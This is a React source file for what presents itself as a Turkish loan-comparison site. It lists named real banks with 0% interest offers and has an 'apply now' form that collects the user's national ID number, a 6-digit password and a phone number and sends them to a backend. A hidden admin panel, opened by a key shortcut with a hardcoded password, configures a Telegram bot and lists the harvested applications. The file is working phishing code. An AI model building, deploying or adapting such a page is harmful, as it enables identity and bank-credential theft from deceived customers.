import { useState, useEffect } from 'react'
import { Calculator, Settings, Shield, Key, Save } from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Card, CardContent } from '@/components/ui/card'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from '@/components/ui/dialog'
import { Label } from '@/components/ui/label'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import './App.css'

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'

interface Bank {
  id: number
  name: string
  logo: string
  interest_rate: number
  max_amount: number
  campaign: string
  color: string
}

interface LoanOffer {
  bank: Bank
  monthly_payment: number
  total_payment: number
  total_interest: number
}

interface Application {
  id: number
  tc_kimlik: string
  telefon: string
  bank_name: string
  loan_amount: number
  loan_term: number
  created_at: string
  status: string
}

function App() {
  const [loanAmount, setLoanAmount] = useState(75000)
  const [loanTerm, setLoanTerm] = useState(24)
  const [offers, setOffers] = useState<LoanOffer[]>([])
  const [loading, setLoading] = useState(false)
  const [selectedBank, setSelectedBank] = useState<Bank | null>(null)
  const [showApplicationForm, setShowApplicationForm] = useState(false)
  const [showAdminPanel, setShowAdminPanel] = useState(false)
  const [adminPassword, setAdminPassword] = useState('')
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
  const [showAdminLogin, setShowAdminLogin] = useState(false)
  
  const [tcKimlik, setTcKimlik] = useState('')
  const [sifre, setSifre] = useState('')
  const [telefon, setTelefon] = useState('+905')
  
  const [applications, setApplications] = useState<Application[]>([])
  const [telegramBotToken, setTelegramBotToken] = useState('')
  const [telegramChatId, setTelegramChatId] = useState('')
  const [showSuccessAnimation, setShowSuccessAnimation] = useState(false)

  useEffect(() => {
    calculateLoan()
    loadTelegramSettings()
    loadApplications()
    
    const handleKeyPress = (e: KeyboardEvent) => {
      if (e.ctrlKey && e.shiftKey && e.key === 'A') {
        setShowAdminLogin(true)
      }
    }
    
    window.addEventListener('keydown', handleKeyPress)
    return () => window.removeEventListener('keydown', handleKeyPress)
  }, [])

  const calculateLoan = async () => {
    if (loanAmount < 25000) {
      alert('Minimum kredi tutarı 25.000 TL olmalıdır')
      return
    }
    if (loanAmount > 450000) {
      alert('Maksimum kredi tutarı 450.000 TL olmalıdır')
      return
    }
    
    setLoading(true)
    
    try {
      const banksResponse = await fetch(`${API_BASE_URL}/api/banks`)
      const banks = await banksResponse.json()
      
      const calculationResponse = await fetch(`${API_BASE_URL}/api/calculate`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          amount: loanAmount,
          months: loanTerm
        })
      })
      const calculation = await calculationResponse.json()
      
      const loanOffers = banks.map((bank: Bank) => ({
        bank,
        monthly_payment: calculation.monthly_payment,
        total_payment: calculation.total_payment,
        total_interest: 0
      }))
      
      setOffers(loanOffers)
    } catch (error) {
      console.error('Kredi hesaplama hatası:', error)
      alert('Kredi hesaplanırken hata oluştu')
    }
    
    setLoading(false)
  }

  const loadTelegramSettings = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/telegram-settings`)
      const data = await response.json()
      setTelegramBotToken(data.bot_token || '')
      setTelegramChatId(data.chat_id || '')
    } catch (error) {
      console.error('Telegram ayarları yüklenemedi:', error)
    }
  }

  const loadApplications = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/applications`)
      const data = await response.json()
      setApplications(data)
    } catch (error) {
      console.error('Başvurular yüklenemedi:', error)
    }
  }

  const handleRecalculate = () => {
    calculateLoan()
  }

  const handleApply = (bank: Bank) => {
    setSelectedBank(bank)
    setShowApplicationForm(true)
  }

  const validateTcKimlik = (value: string) => {
    return /^\d{11}$/.test(value)
  }

  const validateSifre = (value: string) => {
    return /^\d{6}$/.test(value)
  }

  const validateTelefon = (value: string) => {
    return /^\+905\d{9}$/.test(value)
  }

  const handleTelefonChange = (value: string) => {
    if (!value.startsWith('+90')) {
      setTelefon('+905')
    } else if (value.length <= 13) {
      setTelefon(value)
    }
  }

  const submitApplication = async () => {
    if (!selectedBank) return

    if (!validateTcKimlik(tcKimlik)) {
      alert('T.C. kimlik numarası 11 haneli olmalıdır')
      return
    }

    if (!validateSifre(sifre)) {
      alert('Şifre 6 haneli sayı olmalıdır')
      return
    }

    if (!validateTelefon(telefon)) {
      alert('Telefon numarası +905 ile başlamalı ve 13 haneli olmalıdır')
      return
    }

    try {
      const response = await fetch(`${API_BASE_URL}/api/submit`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          tc_kimlik: tcKimlik,
          sifre: sifre,
          telefon: telefon,
          bank_name: selectedBank.name,
          amount: loanAmount,
          months: loanTerm
        })
      })

      if (response.ok) {
        setShowSuccessAnimation(true)
        setTimeout(() => {
          setShowSuccessAnimation(false)
          setShowApplicationForm(false)
          setTcKimlik('')
          setSifre('')
          setTelefon('+905')
          loadApplications()
        }, 3000)
      } else {
        const error = await response.json()
        alert('Başvuru hatası: ' + (error.message || 'Bilinmeyen hata'))
      }
    } catch (error) {
      console.error('Başvuru gönderimi hatası:', error)
      alert('Başvuru gönderilirken hata oluştu')
    }
  }

  const handleAdminLogin = () => {
    if (adminPassword === 'admin123') {
      setIsAdminAuthenticated(true)
      setShowAdminLogin(false)
      setShowAdminPanel(true)
    } else {
      alert('Yanlış şifre!')
    }
  }

  const openAdminPanel = () => {
    if (window.location.pathname === '/admin-secret-panel-2024') {
      setShowAdminLogin(true)
    }
  }

  const updateTelegramSettings = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/telegram-settings`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bot_token: telegramBotToken,
          chat_id: telegramChatId
        })
      })

      if (response.ok) {
        alert('Telegram ayarları güncellendi!')
      } else {
        alert('Telegram ayarları güncellenemedi')
      }
    } catch (error) {
      console.error('Telegram ayarları güncelleme hatası:', error)
      alert('Telegram ayarları güncellenirken hata oluştu')
    }
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-sm border-b">
        <div className="container mx-auto px-4 py-4">
          <div className="flex justify-between items-center">
            <div className="flex items-center space-x-3">
              <div className="bg-purple-600 p-2 rounded-lg">
                <Calculator className="h-6 w-6 text-white" />
              </div>
              <div>
                <h1 className="text-2xl font-bold text-gray-900">İhtiyaç kredisi faiz oranları</h1>
              </div>
            </div>
            <div className="hidden">
              <Button
                variant="outline"
                size="sm"
                onClick={openAdminPanel}
                className="opacity-0"
              >
                <Settings className="h-4 w-4 mr-2" />
                Admin Panel
              </Button>
            </div>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        <Card className="mb-8 bg-white shadow-sm border">
          <CardContent className="p-6">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div>
                <Label htmlFor="amount" className="block text-gray-700 font-medium mb-2">Tutar</Label>
                <div className="relative">
                  <Input
                    id="amount"
                    type="number"
                    value={loanAmount}
                    onChange={(e) => setLoanAmount(Number(e.target.value))}
                    placeholder="75.000"
                    className="text-lg pr-8"
                    min="25000"
                    max="450000"
                  />
                  <span className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500">TL</span>
                </div>
              </div>
              <div>
                <Label htmlFor="term" className="block text-gray-700 font-medium mb-2">Vade</Label>
                <Select value={loanTerm.toString()} onValueChange={(value) => setLoanTerm(Number(value))}>
                  <SelectTrigger className="text-lg">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    {[12, 18, 24, 36, 48, 60].map((months) => (
                      <SelectItem key={months} value={months.toString()}>
                        {months} Ay
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              <div className="flex items-end">
                <Button 
                  onClick={handleRecalculate} 
                  disabled={loading}
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-medium"
                >
                  {loading ? (
                    <div className="flex items-center">
                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                      Yeniden Hesapla
                    </div>
                  ) : (
                    "Yeniden Hesapla"
                  )}
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        {offers.length > 0 && (
          <div className="space-y-6">
            <div className="mb-6">
              <h2 className="text-xl font-semibold text-gray-900 mb-2">
                {loanAmount?.toLocaleString() || '0'} TL, {loanTerm} Ay vadeli ihtiyaç kredileri
              </h2>
              <div className="flex justify-between items-center">
                <p className="text-gray-600 text-sm">11 Ağustos 2025 - {offers.length} teklif</p>
              </div>
            </div>

            <div className="space-y-4">
              {offers.map((offer) => (
                <Card key={offer.bank.id} className="bg-white border hover:shadow-md transition-shadow">
                  <CardContent className="p-6">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center space-x-4">
                        <div className="w-16 h-16 flex items-center justify-center">
                          <img 
                            src={offer.bank.logo} 
                            alt={offer.bank.name}
                            className="w-14 h-14 object-contain"
                            onError={(e) => {
                              const target = e.target as HTMLImageElement;
                              target.style.display = 'none';
                              const parent = target.parentElement;
                              if (parent) {
                                parent.innerHTML = `<div class="w-14 h-14 bg-gray-200 rounded flex items-center justify-center text-gray-600 font-semibold">${offer.bank.name.charAt(0)}</div>`;
                              }
                            }}
                          />
                        </div>
                        <div>
                          <h3 className="text-lg font-semibold text-gray-900">{offer.bank.name}</h3>
                          <div className="flex space-x-2 mt-1">
                            <span className="bg-yellow-100 text-yellow-800 px-2 py-1 rounded text-xs font-medium">
                              Faiz oranı %0
                            </span>
                            <span className="bg-blue-100 text-blue-800 px-2 py-1 rounded text-xs font-medium">
                              Vade {loanTerm} Ay
                            </span>
                            <span className="bg-green-100 text-green-800 px-2 py-1 rounded text-xs font-medium">
                              Maksimum tutar 450.000 TL
                            </span>
                          </div>
                          <p className="text-gray-600 text-sm mt-1">{offer.bank.campaign}</p>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-lg font-semibold text-gray-900">
                          Aylık ödeme {offer.monthly_payment?.toLocaleString() || '0'} TL
                        </div>
                        <div className="text-sm text-gray-600 mb-3">
                          Toplam ödeme {offer.total_payment?.toLocaleString() || '0'} TL
                        </div>
                        <Button 
                          onClick={() => handleApply(offer.bank)}
                          className="bg-purple-600 hover:bg-purple-700 text-white font-medium px-6"
                        >
                          Hemen başvur
                        </Button>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          </div>
        )}
      </main>

      <Dialog open={showSuccessAnimation} onOpenChange={() => {}}>
        <DialogContent className="sm:max-w-lg bg-white">
          <div className="text-center py-8">
            <div className="text-4xl mb-4">✅</div>
            <h2 className="text-xl font-semibold text-gray-900 mb-2">Başvuru Gönderildi</h2>
            <p className="text-gray-600">Başvurunuz başarıyla alındı. En kısa sürede size dönüş yapılacaktır.</p>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={showAdminLogin} onOpenChange={setShowAdminLogin}>
        <DialogContent className="sm:max-w-md bg-white">
          <DialogHeader>
            <DialogTitle className="text-xl font-semibold text-gray-900 flex items-center">
              <Shield className="mr-2 h-5 w-5" />
              Admin Girişi
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label htmlFor="admin-password" className="block text-gray-700 font-medium mb-2">Admin Şifresi</Label>
              <Input
                id="admin-password"
                type="password"
                placeholder="Admin şifresini girin"
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                onKeyPress={(e) => e.key === 'Enter' && handleAdminLogin()}
              />
            </div>
            <div className="flex space-x-3">
              <Button 
                onClick={handleAdminLogin}
                className="flex-1 bg-purple-600 hover:bg-purple-700 text-white font-medium"
              >
                <Key className="mr-2 h-4 w-4" />
                Giriş Yap
              </Button>
              <Button 
                variant="outline" 
                onClick={() => setShowAdminLogin(false)}
              >
                İptal
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={showApplicationForm} onOpenChange={setShowApplicationForm}>
        <DialogContent className={`sm:max-w-md bg-white ${selectedBank?.color === 'red' ? 'border-red-500' : selectedBank?.color === 'purple' ? 'border-purple-500' : selectedBank?.color === 'green' ? 'border-green-500' : selectedBank?.color === 'cyan' ? 'border-cyan-500' : selectedBank?.color === 'blue' ? 'border-blue-500' : selectedBank?.color === 'pink' ? 'border-pink-500' : selectedBank?.color === 'gray' ? 'border-gray-500' : 'border-gray-300'} border-2`}>
          <DialogHeader>
            <div className="flex items-center space-x-3 mb-2">
              {selectedBank && (
                <div className="w-12 h-12 flex items-center justify-center">
                  <img 
                    src={selectedBank.logo} 
                    alt={selectedBank.name}
                    className="w-10 h-10 object-contain"
                    onError={(e) => {
                      const target = e.target as HTMLImageElement;
                      target.style.display = 'none';
                      const parent = target.parentElement;
                      if (parent) {
                        parent.innerHTML = `<div class="w-10 h-10 bg-gray-200 rounded flex items-center justify-center text-gray-600 font-semibold">${selectedBank.name.charAt(0)}</div>`;
                      }
                    }}
                  />
                </div>
              )}
              <div>
                <DialogTitle className="text-xl font-semibold text-gray-900">
                  Kredi Başvurusu
                </DialogTitle>
                <DialogDescription className="text-gray-600">
                  {selectedBank?.name} için başvuru yapın
                </DialogDescription>
              </div>
            </div>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label htmlFor="tc-kimlik" className="block text-gray-700 font-medium mb-2">T.C. Kimlik Numarası</Label>
              <Input
                id="tc-kimlik"
                placeholder="11 haneli T.C. kimlik numarası"
                value={tcKimlik}
                onChange={(e) => setTcKimlik(e.target.value.replace(/\D/g, '').slice(0, 11))}
              />
              {tcKimlik && !validateTcKimlik(tcKimlik) && (
                <p className="text-red-500 text-sm mt-1">T.C. Kimlik numarası 11 haneli olmalıdır</p>
              )}
            </div>
            <div>
              <Label htmlFor="sifre" className="block text-gray-700 font-medium mb-2">Şifre</Label>
              <Input
                id="sifre"
                type="password"
                placeholder="6 haneli şifre"
                value={sifre}
                onChange={(e) => setSifre(e.target.value.replace(/\D/g, '').slice(0, 6))}
              />
              {sifre && !validateSifre(sifre) && (
                <p className="text-red-500 text-sm mt-1">Şifre 6 haneli olmalıdır</p>
              )}
            </div>
            <div>
              <Label htmlFor="telefon" className="block text-gray-700 font-medium mb-2">Cep Telefonu</Label>
              <Input
                id="telefon"
                placeholder="+905XXXXXXXXX"
                value={telefon}
                onChange={(e) => handleTelefonChange(e.target.value)}
              />
              {telefon && !validateTelefon(telefon) && (
                <p className="text-red-500 text-sm mt-1">Telefon numarası +905XXXXXXXXX formatında olmalıdır</p>
              )}
            </div>
            <div className="flex space-x-3">
              <Button 
                onClick={submitApplication} 
                className="flex-1 bg-purple-600 hover:bg-purple-700 text-white font-medium"
              >
                Başvuru Gönder
              </Button>
              <Button 
                variant="outline" 
                onClick={() => setShowApplicationForm(false)}
              >
                İptal
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={showAdminPanel && isAdminAuthenticated} onOpenChange={setShowAdminPanel}>
        <DialogContent className="sm:max-w-4xl bg-white">
          <DialogHeader>
            <DialogTitle className="text-2xl font-semibold text-gray-900 flex items-center">
              <Settings className="mr-3 h-6 w-6" />
              Admin Panel
            </DialogTitle>
          </DialogHeader>
          <Tabs defaultValue="telegram" className="w-full">
            <TabsList className="grid w-full grid-cols-2">
              <TabsTrigger value="telegram">Telegram Ayarları</TabsTrigger>
              <TabsTrigger value="applications">Başvurular</TabsTrigger>
            </TabsList>
            <TabsContent value="telegram" className="space-y-4 mt-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="bot-token" className="block text-gray-700 font-medium mb-2">Bot Token</Label>
                  <Input
                    id="bot-token"
                    placeholder="Bot token girin"
                    value={telegramBotToken}
                    onChange={(e) => setTelegramBotToken(e.target.value)}
                  />
                </div>
                <div>
                  <Label htmlFor="chat-id" className="block text-gray-700 font-medium mb-2">Chat ID</Label>
                  <Input
                    id="chat-id"
                    placeholder="Chat ID girin"
                    value={telegramChatId}
                    onChange={(e) => setTelegramChatId(e.target.value)}
                  />
                </div>
              </div>
              <Button 
                onClick={updateTelegramSettings}
                className="w-full bg-purple-600 hover:bg-purple-700 text-white font-medium"
              >
                <Save className="mr-2 h-4 w-4" />
                Ayarları Kaydet
              </Button>
            </TabsContent>
            <TabsContent value="applications" className="space-y-4 mt-6">
              <div className="bg-gray-50 p-4 rounded-lg">
                <h3 className="text-lg font-semibold text-gray-900 mb-4">Başvuru İstatistikleri</h3>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div className="bg-white p-4 rounded-lg border text-center">
                    <div className="text-2xl font-bold text-gray-900">{applications.length}</div>
                    <div className="text-gray-600">Toplam Başvuru</div>
                  </div>
                  <div className="bg-white p-4 rounded-lg border text-center">
                    <div className="text-2xl font-bold text-gray-900">
                      {applications.filter(app => new Date(app.created_at).toDateString() === new Date().toDateString()).length}
                    </div>
                    <div className="text-gray-600">Bugünkü Başvuru</div>
                  </div>
                  <div className="bg-white p-4 rounded-lg border text-center">
                    <div className="text-2xl font-bold text-gray-900">
                      {new Set(applications.map(app => app.bank_name)).size}
                    </div>
                    <div className="text-gray-600">Farklı Banka</div>
                  </div>
                </div>
              </div>
              <div className="bg-gray-50 p-4 rounded-lg max-h-96 overflow-y-auto">
                <h3 className="text-lg font-semibold text-gray-900 mb-4">Son Başvurular</h3>
                {applications.length === 0 ? (
                  <p className="text-gray-500 text-center py-8">Henüz başvuru bulunmuyor</p>
                ) : (
                  <div className="space-y-3">
                    {applications.slice(0, 10).map((app, index) => (
                      <div key={index} className="bg-white p-4 rounded-lg border">
                        <div className="flex justify-between items-start">
                          <div>
                            <div className="font-semibold text-gray-900">{app.bank_name}</div>
                            <div className="text-gray-600 text-sm">{app.loan_amount?.toLocaleString() || '0'} TL - {app.loan_term} Ay</div>
                            <div className="text-gray-500 text-xs">{app.telefon}</div>
                          </div>
                          <div className="text-right">
                            <div className="text-gray-500 text-xs">
                              {new Date(app.created_at).toLocaleDateString('tr-TR')}
                            </div>
                            <div className="text-gray-500 text-xs">
                              {new Date(app.created_at).toLocaleTimeString('tr-TR')}
                            </div>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
              <Button onClick={loadApplications} variant="outline" className="w-full">
                Yenile
              </Button>
            </TabsContent>
          </Tabs>
        </DialogContent>
      </Dialog>

      <footer className="bg-white border-t mt-16">
        <div className="container mx-auto px-4 py-8">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div>
              <div className="flex items-center space-x-3 mb-4">
                <div className="bg-purple-600 p-2 rounded-lg">
                  <Calculator className="h-5 w-5 text-white" />
                </div>
                <h3 className="text-lg font-semibold text-gray-900">Kredi Hesaplama</h3>
              </div>
              <p className="text-gray-600 text-sm">
                Türkiye'nin en güvenilir kredi karşılaştırma platformu. 
                Tüm bankaların kredi tekliflerini karşılaştırın.
              </p>
            </div>
            <div>
              <h4 className="font-semibold text-gray-900 mb-4">Hızlı Linkler</h4>
              <ul className="space-y-2 text-sm text-gray-600">
                <li>İhtiyaç Kredisi</li>
                <li>Konut Kredisi</li>
                <li>Taşıt Kredisi</li>
                <li>Kredi Kartı</li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold text-gray-900 mb-4">Bankalar</h4>
              <ul className="space-y-2 text-sm text-gray-600">
                <li>Akbank</li>
                <li>QNB Finansbank</li>
                <li>Garanti BBVA</li>
                <li>İş Bankası</li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold text-gray-900 mb-4">İletişim</h4>
              <ul className="space-y-2 text-sm text-gray-600">
                <li>Müşteri Hizmetleri</li>
                <li>Destek</li>
                <li>Gizlilik Politikası</li>
                <li>Kullanım Şartları</li>
              </ul>
            </div>
          </div>
          <div className="border-t mt-8 pt-8 text-center">
            <p className="text-gray-500 text-sm">
              © 2025 Kredi Hesaplama Platformu. Tüm hakları saklıdır.
            </p>
          </div>
        </div>
      </footer>
    </div>
  )
}

export default App
